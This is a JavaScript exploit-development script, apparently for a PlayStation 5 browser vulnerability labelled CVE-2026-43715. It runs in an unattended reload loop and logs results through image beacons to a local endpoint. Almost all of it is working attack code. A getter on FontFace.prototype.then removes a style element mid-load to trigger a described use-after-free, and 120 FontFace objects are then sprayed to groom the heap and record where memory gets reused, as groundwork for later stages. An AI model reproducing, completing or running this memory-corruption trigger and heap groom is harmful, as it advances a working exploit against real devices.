// p457 — CVE-2026-43715 Stage 2: overnight distribution census
// (AUTO-RELOAD LOOP — designed to run unattended 24/7)
// Beacon prefix: V457-
//
// The PS5 stays parked on the User's Guide page; this script runs the
// proven JS-face groom (p455/p456), beacons which spray position
// flips, and reloads the page for the next run. Purpose: a flip-
// position distribution across thousands of unattended runs — the
// statistical base the size-mismatch shaping (p458+) needs.
//
// One line per run: FLIPPOS-<k> (or NOFLIP / DIED-boot-count). The
// Mac-side night watcher (scripts/night-watch.sh, cron) tallies and
// commits these without anyone at the console.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V457-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var hits = 0;
  var jfaces = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        for (var k = 0; k < 120; k++) {
          var ff = new FontFace('j' + k, BAD);
          document.fonts.add(ff);
          jfaces.push(ff);
        }
      }
      return undefined;
    },
    configurable: true
  });

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round0() {
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE-RELOAD'); setTimeout(reload, 2000); return; }

    void face.loaded;
    face.load().then(
      function() {
        var flipped = -1, others = 0;
        for (var k = 0; k < jfaces.length; k++) {
          var s;
          try { s = jfaces[k].status; } catch(e) { s = 'THROW'; }
          if (s === 'loaded') { flipped = k; }
          else if (s !== 'unloaded') { others++; }
        }
        B(flipped >= 0 ? 'FLIPPOS-' + flipped : 'NOFLIP');
        if (others) B('ODDSTAT-' + others);
        setTimeout(reload, 2500);        // next run
      },
      function(e) { B('NO-0-RELOAD'); setTimeout(reload, 2000); }
    );
  }

  function reload() {
    location.replace('fa-v457-distribution.html?r=' + Date.now());
  }

  round0();
  // watchdog: if the trigger never completes, reload anyway so the
  // loop never stalls
  setTimeout(function() {
    B('WATCHDOG-RELOAD-H' + hits);
    reload();
  }, 30000);
})();
